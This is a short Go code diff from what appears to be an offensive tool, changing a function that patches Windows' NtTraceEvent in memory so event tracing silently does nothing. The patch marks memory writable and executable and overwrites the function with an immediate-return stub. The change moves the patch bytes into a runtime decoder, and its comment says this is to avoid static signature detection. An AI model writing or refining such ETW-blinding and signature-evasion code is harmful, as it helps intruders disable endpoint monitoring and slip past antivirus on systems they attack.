@@ -27,8 +27,8 @@ func etwNtTraceEvent() string {
 		return "NtTraceEvent bypass: NtTraceEvent not found"
 	}
 
-	// Patch: xor eax, eax; ret (0x31 0xC0 0xC3) — return STATUS_SUCCESS immediately
-	patch := []byte{0x31, 0xC0, 0xC3}
+	// Decode patch bytes at runtime to avoid static signature {0x31, 0xC0, 0xC3}
+	patch := decodeBypassPatch()
 
 	var oldProtect uint32
 	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
